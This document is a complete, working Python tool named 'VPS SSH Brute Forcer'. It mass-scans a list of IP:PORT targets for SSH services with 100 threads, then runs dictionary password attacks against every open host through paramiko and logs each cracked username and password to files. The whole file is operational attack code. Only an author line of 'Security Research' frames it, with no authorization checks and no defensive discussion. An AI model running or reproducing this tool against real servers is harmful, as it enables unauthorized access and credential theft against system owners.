#!/usr/bin/env python3
"""
VPS SSH BRUTE FORCER - IP:PORT Scanner + Attacker
Reads IP:PORT from file, scans if port is open, then brute forces
Author: Security Research
"""

import socket
import threading
import paramiko
import sys
import time
import queue
import random
import os
from datetime import datetime

class VPSPortSSHBruteforcer:
    def __init__(self, threads=100, timeout=5):
        self.threads = threads
        self.timeout = timeout
        self.scan_queue = queue.Queue()
        self.brute_queue = queue.Queue()  # Fixed: removed the dot
        self.open_ssh = []
        self.found_creds = []
        self.failed_targets = []
        self.lock = threading.Lock()
        self.scanning = True
        self.brute_running = True
        self.total_scanned = 0
        self.total_found = 0
        self.start_time = None
        self.total_targets = 0  # Fixed: removed the dot
        
        # Print banner
        self.print_banner()
    
    def print_banner(self):
        print("""\033[91m
╔═══════════════════════════════════════════════════════════════════════╗
║                 VPS SSH BRUTE FORCER - IP:PORT Scanner               ║
║            Reads IP:Port from file → Scans → Brute Forces            ║
╚═══════════════════════════════════════════════════════════════════════╝\033[0m""")
    
    def load_targets(self, filepath):
        """Load IP:PORT targets from file"""
        targets = []
        invalid = []
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse IP:PORT format
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) == 2:
                            ip = parts[0].strip()
                            try:
                                port = int(parts[1].strip())
                                targets.append({'ip': ip, 'port': port, 'line': line_num})
                            except ValueError:
                                invalid.append(f"Line {line_num}: Invalid port - {line}")
                        else:
                            invalid.append(f"Line {line_num}: Invalid format (use IP:PORT) - {line}")
                    else:
                        invalid.append(f"Line {line_num}: Missing port (use IP:PORT) - {line}")
            
            self.total_targets = len(targets)
            
            print(f"\033[92m[+] Loaded {len(targets)} targets from {filepath}\033[0m")
            if invalid:
                print(f"\033[93m[!] {len(invalid)} invalid entries skipped\033[0m")
                for err in invalid[:5]:  # Show first 5 errors
                    print(f"    {err}")
            
            return targets
            
        except FileNotFoundError:
            print(f"\033[91m[-] File not found: {filepath}\033[0m")
            return []
        except Exception as e:
            print(f"\033[91m[-] Error loading targets: {e}\033[0m")
            return []
    
    def load_usernames(self, filepath):
        """Load usernames from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
            print(f"\033[92m[+] Loaded {len(usernames)} usernames from {filepath}\033[0m")
            return usernames
        except Exception as e:
            print(f"\033[91m[-] Error loading usernames: {e}\033[0m")
            return []
    
    def load_passwords(self, filepath):
        """Load passwords from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"\033[92m[+] Loaded {len(passwords)} passwords from {filepath}\033[0m")
            return passwords
        except Exception as e:
            print(f"\033[91m[-] Error loading passwords: {e}\033[0m")
            return []
    
    def scan_target(self, ip, port):
        """Scan single IP:PORT to check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Port open - try to get banner
                try:
                    sock.settimeout(2)
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    sock.close()
                    
                    # Check if it's SSH
                    if 'SSH' in banner or 'ssh' in banner.lower() or 'OpenSSH' in banner:
                        with self.lock:
                            self.open_ssh.append({
                                'ip': ip,
                                'port': port,
                                'banner': banner[:100]
                            })
                        print(f"\033[92m[✓] OPEN SSH: {ip}:{port} - {banner[:50]}\033[0m")
                        return True
                    else:
                        # Port open but not SSH
                        print(f"\033[93m[?] PORT OPEN (not SSH): {ip}:{port} - {banner[:30]}\033[0m")
                        with self.lock:
                            self.failed_targets.append({'ip': ip, 'port': port, 'reason': 'Not SSH'})
                except:
                    # Port open but no banner - assume SSH
                    with self.lock:
                        self.open_ssh.append({
                            'ip': ip,
                            'port': port,
                            'banner': 'No banner'
                        })
                    print(f"\033[93m[?] POSSIBLE SSH: {ip}:{port} (no banner)\033[0m")
                    return True
            else:
                # Port closed
                with self.lock:
                    self.failed_targets.append({'ip': ip, 'port': port, 'reason': 'Closed'})
            
            sock.close()
            
        except socket.timeout:
            with self.lock:
                self.failed_targets.append({'ip': ip, 'port': port, 'reason': 'Timeout'})
        except socket.error as e:
            with self.lock:
                self.failed_targets.append({'ip': ip, 'port': port, 'reason': str(e)[:30]})
        except Exception as e:
            with self.lock:
                self.failed_targets.append({'ip': ip, 'port': port, 'reason': 'Unknown error'})
        
        return False
    
    def scanner_worker(self):
        """Worker thread for scanning targets"""
        while self.scanning:
            try:
                target = self.scan_queue.get(timeout=1)
                ip = target['ip']
                port = target['port']
                line_num = target['line']
                
                with self.lock:
                    self.total_scanned += 1
                
                # Progress update
                if self.total_scanned % 10 == 0:
                    elapsed = time.time() - self.start_time if self.start_time else 0
                    rate = self.total_scanned / elapsed if elapsed > 0 else 0
                    remaining = self.total_targets - self.total_scanned
                    eta = remaining / rate if rate > 0 else 0
                    
                    print(f"\r\033[94m[*] Scanned: {self.total_scanned}/{self.total_targets} | Found: {len(self.open_ssh)} | Rate: {rate:.1f}/s | ETA: {eta:.0f}s\033[0m", end='')
                
                # Scan the target
                self.scan_target(ip, port)
                
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def ssh_connect(self, ip, port, username, password):
        """Attempt SSH connection"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout,
                compress=False
            )
            
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            if "Error reading SSH protocol banner" in str(e):
                time.sleep(0.5)
            return False
        except socket.timeout:
            return False
        except socket.error:
            return False
        except Exception as e:
            return False
    
    def brute_worker(self, usernames, passwords):
        """Worker thread for brute forcing"""
        while self.brute_running:
            try:
                target = self.brute_queue.get(timeout=1)
                ip = target['ip']
                port = target['port']
                banner = target.get('banner', 'Unknown')
                
                print(f"\n\033[94m[*] Attacking: {ip}:{port} [{banner[:30]}]\033[0m")
                
                attempts = 0
                found = False
                
                for username in usernames:
                    if not self.brute_running or found:
                        break
                    
                    for password in passwords:
                        if not self.brute_running or found:
                            break
                        
                        attempts += 1
                        
                        # Show progress
                        if attempts % 50 == 0:
                            print(f"\033[90m    Progress: {attempts}/{len(usernames)*len(passwords)} attempts\033[0m", end='\r')
                        else:
                            print(f"\033[90m    Trying: {username}:{password}\033[0m", end='\r')
                        
                        if self.ssh_connect(ip, port, username, password):
                            result = f"\n\033[92m[🔥] SUCCESS! {ip}:{port} - {username}:{password}\033[0m"
                            print(result)
                            
                            with self.lock:
                                self.found_creds.append({
                                    'ip': ip,
                                    'port': port,
                                    'username': username,
                                    'password': password,
                                    'banner': banner
                                })
                            
                            # Save immediately
                            self.save_result(ip, port, username, password)
                            
                            found = True
                            break
                        
                        # Small delay to avoid overwhelming
                        time.sleep(0.05)
                
                self.brute_queue.task_done()
                
                if not found:
                    print(f"\n\033[91m[-] Failed: {ip}:{port} - No valid credentials\033[0m")
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def save_result(self, ip, port, username, password):
        """Save found credentials"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('vps_ssh_found.txt', 'a') as f:
            f.write(f"[{timestamp}] {ip}:{port} - {username}:{password}\n")
    
    def save_open_ssh(self):
        """Save open SSH hosts"""
        with open('vps_open_ssh.txt', 'w') as f:
            f.write(f"# Open SSH hosts found - {datetime.now()}\n")
            f.write(f"# Total: {len(self.open_ssh)}\n\n")
            for ssh in self.open_ssh:
                f.write(f"{ssh['ip']}:{ssh['port']} | {ssh['banner']}\n")
    
    def save_failed_targets(self):
        """Save failed targets for analysis"""
        with open('vps_failed.txt', 'w') as f:
            f.write(f"# Failed targets - {datetime.now()}\n")
            f.write(f"# Total: {len(self.failed_targets)}\n\n")
            for target in self.failed_targets:
                f.write(f"{target['ip']}:{target['port']} | {target['reason']}\n")
    
    def print_summary(self):
        """Print scan summary"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 SCAN SUMMARY\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Total targets: {self.total_targets}")
        print(f"Scanned: {self.total_scanned}")
        print(f"Open SSH: {len(self.open_ssh)}")
        print(f"Failed: {len(self.failed_targets)}")
        print(f"Credentials found: {len(self.found_creds)}")
        print(f"Time elapsed: {elapsed:.1f} seconds")
        print(f"Scan rate: {self.total_scanned/elapsed:.1f} targets/sec" if elapsed > 0 else "Scan rate: N/A")
        print(f"\033[96m{'='*60}\033[0m")
    
    def run(self):
        """Main execution"""
        self.start_time = time.time()
        
        print("\n\033[93m[?] Enter target file (IP:PORT per line):\033[0m")
        target_file = input("> ").strip()
        
        if not target_file:
            print("\033[91m[-] No target file specified\033[0m")
            return
        
        # Load targets
        targets = self.load_targets(target_file)
        
        if not targets:
            print("\033[91m[-] No valid targets loaded\033[0m")
            return
        
        # Load wordlists
        print("\n\033[93m[?] Enter username list file:\033[0m")
        username_file = input("> ").strip()
        
        print("\033[93m[?] Enter password list file:\033[0m")
        password_file = input("> ").strip()
        
        if not username_file or not password_file:
            print("\033[91m[-] Username and password lists required\033[0m")
            return
        
        usernames = self.load_usernames(username_file)
        passwords = self.load_passwords(password_file)
        
        if not usernames or not passwords:
            print("\033[91m[-] Failed to load wordlists\033[0m")
            return
        
        # ===== PHASE 1: SCAN TARGETS =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔍 PHASE 1: SCANNING {len(targets)} TARGETS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Threads: {self.threads}")
        print(f"Timeout: {self.timeout}s")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Fill scan queue
        for target in targets:
            self.scan_queue.put(target)
        
        # Start scanner threads
        scanner_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.scanner_worker)
            t.daemon = True
            t.start()
            scanner_threads.append(t)
        
        # Wait for scanning to complete
        try:
            self.scan_queue.join()
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Scan interrupted\033[0m")
            self.scanning = False
        
        self.scanning = False
        
        # Save results
        self.save_open_ssh()
        self.save_failed_targets()
        
        # Print summary
        self.print_summary()
        
        if not self.open_ssh:
            print(f"\033[91m[-] No open SSH hosts found. Exiting.\033[0m")
            return
        
        # ===== PHASE 2: BRUTE FORCE =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔥 PHASE 2: BRUTE FORCING {len(self.open_ssh)} SSH HOSTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Usernames: {len(usernames)}")
        print(f"Passwords: {len(passwords)}")
        print(f"Total attempts: {len(self.open_ssh) * len(usernames) * len(passwords):,}")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Ask to proceed
        proceed = input(f"\033[93m[?] Proceed with brute force? (y/n): \033[0m").lower()
        if proceed != 'y':
            print(f"\033[91m[-] Exiting\033[0m")
            return
        
        # Fill brute queue
        for ssh in self.open_ssh:
            self.brute_queue.put(ssh)
        
        # Start brute threads
        brute_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.brute_worker, args=(usernames, passwords))
            t.daemon = True
            t.start()
            brute_threads.append(t)
        
        # Monitor brute progress
        try:
            while not self.brute_queue.empty():
                time.sleep(5)
                remaining = self.brute_queue.qsize()
                completed = len(self.open_ssh) - remaining
                percent = (completed / len(self.open_ssh)) * 100 if len(self.open_ssh) > 0 else 0
                
                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)}\033[0m", end='')
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Brute force interrupted\033[0m")
            self.brute_running = False
        
        self.brute_running = False
        
        # ===== FINAL RESULTS =====
        print(f"\n\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 FINAL RESULTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        if self.found_creds:
            print(f"\n\033[92m[🔥] CREDENTIALS FOUND: {len(self.found_creds)}\033[0m")
            print(f"\033[96m{'-'*60}\033[0m")
            for i, cred in enumerate(self.found_creds, 1):
                print(f"{i:2}. {cred['ip']:15}:{cred['port']:<5} | {cred['username']}:{cred['password']}")
            
            # Save final credentials
            with open('vps_creds_final.txt', 'w') as f:
                f.write(f"# VPS SSH Credentials Found - {datetime.now()}\n")
                f.write(f"# Total: {len(self.found_creds)}\n\n")
                for cred in self.found_creds:
                    f.write(f"{cred['ip']}:{cred['port']} | {cred['username']}:{cred['password']}\n")
        else:
            print(f"\n\033[91m[-] No credentials found\033[0m")
        
        print(f"\n\033[92m[+] Results saved to:\033[0m")
        print(f"    - vps_open_ssh.txt (all open SSH hosts)")
        print(f"    - vps_failed.txt (failed targets with reasons)")
        print(f"    - vps_ssh_found.txt (credentials found during attack)")
        print(f"    - vps_creds_final.txt (final credentials list)")

def main():
    """Main function"""
    
    # Check for paramiko
    try:
        import paramiko
    except ImportError:
        print("\033[91m[-] Paramiko not installed. Install with: pip install paramiko\033[0m")
        sys.exit(1)
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - IP:PORT Scanner')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    
    args = parser.parse_args()
    
    # Create and run brute forcer
    brute = VPSPortSSHBruteforcer(threads=args.threads, timeout=args.timeout)
    
    try:
        brute.run()
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Program interrupted by user\033[0m")
        brute.print_summary()
        sys.exit(0)

if __name__ == "__main__":
    main()
